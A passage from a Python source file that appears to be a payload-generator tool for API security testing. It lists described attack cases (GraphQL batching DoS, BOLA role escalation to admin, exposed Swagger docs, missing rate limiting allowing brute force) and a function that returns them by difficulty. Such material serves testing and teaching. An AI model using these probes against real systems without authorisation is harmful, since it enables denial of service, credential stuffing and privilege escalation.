            {"payload": "POST /graphql with 100 nested queries in one request body",
             "description": "GraphQL batching / query depth attack",
             "expected": "Server processes 100 queries simultaneously; resource exhaustion / DoS"},
            {"payload": "GET /api/data?api_key=abc123  (key in URL query string)",
             "description": "API key in URL instead of Authorization header",
             "expected": "API key exposed in browser history, proxy logs, and Referer headers"},
        ],
        "advanced": [
            {"payload": "POST /api/update-role with body {\"role\":\"admin\"} (BOLA — broken object level auth)",
             "description": "Broken Object Level Authorization — attacker accesses another user's object",
             "expected": "Server checks authentication but not ownership; any user modifies any object"},
            {"payload": "GET /swagger-ui.html  or  GET /v3/api-docs",
             "description": "Swagger/OpenAPI spec publicly accessible",
             "expected": "Full API documentation exposed — attacker enumerates all endpoints and schemas"},
            {"payload": "Send 1000 req/sec to /api/login — no 429 returned",
             "description": "No rate limiting on API endpoints",
             "expected": "Unlimited brute force, credential stuffing, or DoS possible"},
        ]
    }
}


async def execute(input: dict) -> dict:
    vuln_type = input["vuln_type"]
    difficulty = input.get("difficulty", "beginner")
    context = input["context"]
    count = input.get("count", 3)
    payloads = PAYLOADS.get(vuln_type, {}).get(difficulty, [])[:count]
    return {
        "vuln_type": vuln_type,
        "difficulty": difficulty,
        "context": context,
        "payloads": payloads
    }
